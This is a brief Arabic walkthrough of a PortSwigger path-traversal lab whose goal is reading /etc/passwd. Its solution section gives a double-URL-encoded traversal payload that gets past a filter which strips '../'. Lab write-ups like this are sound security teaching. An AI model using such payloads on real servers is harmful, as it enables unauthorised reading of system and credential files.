# [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

## **`الهدف`**
الحصول على محتويات ملف `/etc/passwd`
## **`خطوات الحل`**
**`خطوات حل هذا اللاب هي نفسها خطوات حل لاب` [File path traversal, simple case](./File-path-traversal,-simple-case.md)

باختلاف واحد فقط وهو أننا سنقوم بتغيير الجزئية الموجودة في أول سطر من الـ `request` إلى 
```URL-E
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd
```

والذي يحدث عند القيام بعمل `URL Encoding` لـ `../../../` فينتج `%2e%2e%2f%2e%2e%2f%2e%2e%2f` فنقوم بعمل لها `URL Encoding` مرة أخرى ونقوم بتمرير.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [File path traversal, simple case](./File-path-traversal,-simple-case.md)
